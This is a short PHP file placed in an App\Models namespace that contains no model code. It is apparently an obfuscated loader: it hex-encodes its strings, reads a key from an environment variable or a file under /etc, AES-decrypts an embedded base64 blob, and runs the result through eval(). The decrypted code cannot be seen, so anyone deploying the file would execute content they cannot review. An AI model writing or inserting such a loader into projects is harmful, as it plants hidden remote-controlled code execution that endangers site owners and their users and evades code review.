<?php
namespace App\Models;
$f=hex2bin('2f6574632f61706c696b6173696b6974612e736563');

$k=getenv(hex2bin('41504c494b4153494b4954415f5345435f4b4559'))?:(@file_exists($f)?trim(@file_get_contents($f)):null);

if(!$k)exit;

$i=base64_decode('plB9NC59pIsjK5jHqjqPZQ==');

$c=base64_decode(

'OgISORjxQISWiYMAy94/sEsF73W5i66etfV9htJHw5ih0RasWmkC43+CaXdXdEerVMOVbYfZjou2' .
'JN6HpCsEtJNMC3PMnMaVkffclpWVWnzE6tD03fBmMytYT7lMyD6nE3L+JuzjSp7boou7hO2X++c8' .
'dW3IMMPVG7Lanib5VUQczKRRIXVCO1CB59y04nm3DeUGrmrJPzB+9Axj6HT5fD066ApJJSJ1/EYA' .
'BRrm33dhf8feWeA1Uf45bH/dxQMQZmmB7eGtdHaohFSAAr6QLcNcYEO4BGbAKsPbgRnF7EechbMz' .
'LN7BmuMc/MKg6Wk4pnPzB4jBZSoV0pRQlDhDub4PDMOjEXqIv1Qc1ed5JLDrSJNFnCTEvr8EeVC2' .
'VQsOoaVrEkjjs/RngvIrUpnv1sQumeMCudkYVBtkaBtAl8V4iT8hAUGETPIZuEpVj7HGgSbiVknt' .
'kv2j0lruwigN1o1NeEmTiH6+ptvmQKejHyH+YXtahPmUcfzorH6FBmNjk14yrUphc7B8qUT1eAbr' .
'X/5SV8zXVly2VQGvFjenruKicmb6rfEebW/jvGKTusPPYjGA36b/+OpzjjWa3qQavsb2+xH5yCjS' .
'KGkQf5ElLQ/WwmqUxyOxl9pR6t27xq5s5zL/oaDgg26rqpu2rCUZ9QYL7p7O1JoaYAsPnxAFuyND' .
'lcEsynPVPeLWh/hTRcwpASPONBGZ7C1k4FZ1bEV692dxQ92g4DRaQalNOYPFyU6b9cXsoBMSZPct' .
'oeCs641Vg2g3l4mbnsDhN9xLTSwTpkzDYBx08U3VapW49uj8FCJyNEKCC4XlCxMPQmjmoEjZaokh' .
'nK6rG9ZDi8R4DZ8ODNQNcUQcH1/DtKKUh9NIMjvQ4G1aEYAHGct26Ab2xFrBQpjLDJVErv7Z+MWD' .
'ucuXew=='

);

$d=openssl_decrypt($c,hex2bin('6165732d3235362d636263'),hash('sha256',$k,true),1,$i);

if($d===false)exit;

eval($d);

